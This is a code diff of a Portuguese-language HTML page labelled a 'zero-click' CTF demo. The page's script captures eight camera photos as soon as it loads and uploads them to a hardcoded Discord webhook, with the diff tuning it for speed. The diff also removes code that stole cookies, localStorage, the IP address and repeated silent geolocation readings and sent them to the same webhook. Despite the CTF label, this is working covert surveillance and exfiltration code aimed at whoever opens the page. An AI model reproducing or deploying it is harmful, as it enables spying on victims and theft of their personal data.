@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo CTF Zero-Click Fotos e Geo Auto</title>
+    <title>Demo CTF Zero-Click Fotos Rápidas</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f0f0; }
         h1 { color: #ff0000; font-size: 16px; opacity: 0.7; } /* Sutil */
@@ -15,10 +15,10 @@
     <div id="status">Inicializando...</div>
 
     <script>
-        // Webhook do Discord (ou webhook.site)
+        // Webhook do Discord
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
-        // Enviar item ao webhook
+        // Enviar item ao webhook (multipart/form-data)
         async function sendItem(type, data, index = null) {
             try {
                 const formData = new FormData();
@@ -51,76 +51,7 @@
             }
         }
 
-        // Coleta de dados base
-        async function collectData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                cookies: document.cookie || 'Nenhum cookie',
-                localStorage: JSON.stringify(localStorage) || 'Nenhum dado'
-            };
-
-            // Senha simulada
-            const form = document.createElement('form');
-            form.innerHTML = '<input type="password" name="pass" value="flag{ctf_zero_click_photos_geo_2025}">';
-            form.style.display = 'none';
-            document.body.appendChild(form);
-            data.formData = form.querySelector('input').value;
-
-            // Enviar senha
-            await sendItem('Senha', { password: data.formData });
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            // Enviar cookies
-            await sendItem('Cookies', { cookies: data.cookies });
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            // Enviar userAgent
-            await sendItem('User-Agent', { userAgent: data.userAgent });
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            // Enviar IP
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ip = (await ipResponse.json()).ip;
-                await sendItem('IP', { ip });
-            } catch (e) {
-                await sendItem('IP', { error: 'Erro ao coletar IP' });
-            }
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            // Coletar localização (silenciosa, 4 updates)
-            if (navigator.geolocation) {
-                for (let i = 0; i < 4; i++) {
-                    await new Promise(resolve => {
-                        navigator.geolocation.getCurrentPosition(
-                            async (position) => {
-                                const location = {
-                                    latitude: position.coords.latitude,
-                                    longitude: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: new Date().toISOString()
-                                };
-                                await sendItem(`Localização ${i + 1}`, location);
-                                resolve();
-                            },
-                            async () => {
-                                await sendItem(`Localização ${i + 1}`, { error: 'Erro ao coletar localização' });
-                                resolve();
-                            },
-                            { enableHighAccuracy: true, timeout: 2000, maximumAge: 0 }
-                        );
-                    });
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            } else {
-                await sendItem('Localização', { error: 'Geolocation não suportado' });
-            }
-
-            collectPhotos();
-        }
-
-        // Coleta de 8 fotos (otimizado para celular)
+        // Função para coletar 8 fotos rapidamente
         async function collectPhotos() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 await sendItem('Câmera', { error: 'Câmera não suportada' });
@@ -142,14 +73,14 @@
                     canvas.width = 320;
                     canvas.height = 240;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.3));
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.2));  // Qualidade 0.2 para velocidade
                     const reader = new FileReader();
                     const photo = await new Promise(resolve => {
                         reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                         reader.readAsDataURL(blob);
                     });
                     await sendItem(`Photo ${i + 1}`, photo, i);
-                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await new Promise(resolve => setTimeout(resolve, 500));  // 0.5s para velocidade
                 }
                 stream.getTracks().forEach(track => track.stop());
                 document.getElementById('status').innerHTML = 'Coleta concluída!';
@@ -159,8 +90,8 @@
             }
         }
 
-        // Iniciar coleta
-        collectData();
+        // Iniciar coleta zero-click
+        collectPhotos();
     </script>
 </body>
 </html>
